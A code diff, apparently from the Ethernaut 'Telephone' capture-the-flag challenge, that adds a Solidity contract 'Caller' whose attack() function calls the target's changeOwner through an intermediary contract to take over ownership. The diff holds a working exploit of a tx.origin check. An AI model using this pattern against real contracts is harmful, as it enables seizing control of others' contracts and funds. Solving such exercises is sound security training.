@@ -14,3 +14,15 @@ contract Telephone {
         }
     }
 }
+
+contract Caller {
+    Telephone private telephone;
+
+    constructor(address _telephone) {
+        telephone = Telephone(_telephone);
+    }
+
+    function attack() public {
+        telephone.changeOwner(msg.sender);
+    }
+}
